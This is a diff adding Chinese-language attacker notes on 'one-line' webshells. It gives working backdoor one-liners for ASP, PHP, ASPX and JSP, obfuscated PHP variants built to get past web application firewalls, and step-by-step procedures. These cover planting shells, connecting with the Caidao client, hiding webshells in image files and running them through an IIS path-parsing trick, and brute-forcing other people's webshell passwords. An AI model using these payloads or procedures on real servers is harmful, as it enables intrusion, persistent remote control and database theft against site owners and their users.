@@ -1,0 +1,52 @@
+一句话木马2010年：代码少功能强大，但是目前有一些拦截执行代码的函数的waf
+		如何绕过？？？
+	《%execute request("value")%》该脚本本身没有任何危害，就怕有客户端传参数到该文件中，并执行，这里上传的参数可以是
+		是大马（菜刀之所以可以控制web，其实就是一直给一句话脚本传一个恶意参数）
+	类似的一句话：《%eval request("value")%》现在比较常见
+
+	asp一句话：
+		《%eval request("菜刀密码")%》
+
+	php一句话：
+		《?php @eval($_POST["菜刀密码"])?》
+
+	aspx一句话：有权限使用cmd
+		《%eval(Request.Item["菜刀密码"])%》
+		《%@ Page Language="Javascript"%》
+
+	jsp一句话：
+		<%
+		if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());
+		%>
+
+		--->@@操作1：进入rolan--webshell--打开jsp.html--》将服务端中一句话代码--想办法--弄到服务端中--
+			http://127.0.0.1:8080/a.jsp-->将一句话的url放置服务端地址--将jsp版本的菜刀代码（Customize.jsp中的代码）复制到jsp.html
+			修改jsp版本菜刀的密码cc--->提交（此时会在服务器上生成了一个shell.jsp的远端连接）--->菜刀连接（http://127.0.0.1:8080/shell.jsp）
+			--->默认类型Customize+UTF8--->getshell
+
+	IIS：服务器：如果可以支持三个脚本环境，则可以混合上一句话
+		
+
+	一句话变形：
+		《?php $_GET['a']($_POST['b'])?》
+		同理，传给a值为 @base64_decode(base64编码过后的eval)。
+
+		《?php $_GET['a']($_GET['b']);?》
+小马之前的：上传大马
+大马
+打包马：
+脱裤马：
+  
+
+  图片马的制作：因为上传脚本被很多waf或者程序员都发现并禁止了
+
+	--->@@操作1：选取一张图片并用Rolan—》代码审计工具--》C32Asm 工具 以16进制打开这张图片并且找
+			所有的免杀马（asp+php）复制到图片的后面
+	--->@@操作2：通过一些列的手段上传到服务器的目录中，并想办法让它可以被执行（iis 中url/a.asp/b.jpg）
+	--->@@操作3：使用Rolan中webshell里面的caidao远程连接到服务器，连接后可以随意修改脚本文件，并且拿到db
+	or
+	-->@@操作1：文件包含的形式执行一句话 a.asp中引入了一张图片马，访问a.asp一样可以连接上一句话
+
+
+当发现已经网站内部已经有别人的马时，可以去爆破别人的一句话：
+	--->@@操作1：Rolan中--密码攻击--shell爆破--webShell密码暴力破解--载入字典--输入shell地址（一句话位置iis 中url/a.asp/b.jpg）
